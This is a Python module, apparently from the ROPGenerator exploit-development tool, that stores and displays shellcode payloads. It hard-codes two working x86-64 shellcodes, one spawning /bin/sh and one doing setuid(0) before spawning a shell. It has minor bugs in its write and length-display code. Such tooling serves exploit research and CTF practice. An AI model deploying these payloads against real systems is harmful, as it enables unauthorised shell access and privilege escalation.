# ROPGenerator - Shellcode module 
# Managing shellcodes 
import ropgenerator.Analysis as Analysis
from ropgenerator.Colors import string_special, string_bold
from ropgenerator.Config import ROPGENERATOR_DIRECTORY, ARCH


# List of shellcodes 
# A shellcode is stored as a pair (shellcode, description)
native_shellcodes = dict()
custom_shellcodes = dict()

def read_shellcodes(filename):
    res = [] 
    try:
        f = open(filename, 'r')
        while(True):
            l1 = f.readline()[:-1]
            l2 = f.readline()[:-1]
            print(l1)
            print(l2)
            if( not l2 ):
                break
            res.append([l1.decode('hex'), l2])
        f.close()
    except:
        res = []
    return res

# X86 shellcodes 
native_shellcodes['X86'] = []
custom_shellcodes['X86'] = read_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86.custom')
# X86-64 shellcodes 
native_shellcodes['X86-64'] = [
('1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05',
    'Execute /bin/sh - by Dad`'), 
('H1\xff\xb0i\x0f\x05H1\xd2H\xbb\xff/bin/shH\xc1\xeb\x08SH\x89\xe7H1\xc0PWH\x89\xe6\xb0;\x0f\x05j\x01_j<X\x0f\x05', 
     'setuid(0) + execve(/bin/sh) - by evil.xi4oyu')
]
custom_shellcodes['X86-64'] = read_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86-64.custom')

def write_shellcodes(filename, data):
    try:
        f = open(filename, 'w')
        for (shellcode, info) in data:
            f.write(shellcode+'\n'+data+'\n')
        f.close()
    except:
        return
        
def save_shellcodes():
    write_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86.custom', custom_shellcodes['X86'])
    write_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86-64.custom', custom_shellcodes['X86-64'])

def show_shellcodes(arch):
    def short_shellcode(raw):
        res =  "'\\x" + "\\x".join(["%02x"%ord(c) for c in raw]) + "'"
        if( len(res) > 50 ):
            res = res[:46] + "...'"
        return res
    
    global native_shellcodes
    global custom_shellcodes
    
    if( arch not in Analysis.supportedArchs ):
        print("Error. Architecture {} is not supported".format(arch))
        
    print(string_bold('\n\t------------------------------------'))
    print(string_bold("\tAvailable payloads for arch " + string_special(arch)))
    print(string_bold('\t------------------------------------\n'))
    
    if( (not native_shellcodes[arch])and(not custom_shellcodes[arch])):
        print("\n\tNo shellcodes available for architecture " + arch)
    i = 0
    for shellcode in custom_shellcodes[arch] + native_shellcodes[arch] :
        i = i + 1
        print("\t({}) {}\n\t{} - {} bytes".format(string_bold(str(i)), shellcode[1], \
            string_special(short_shellcode(shellcode[0])), str(len(shellcode[1]))))
    
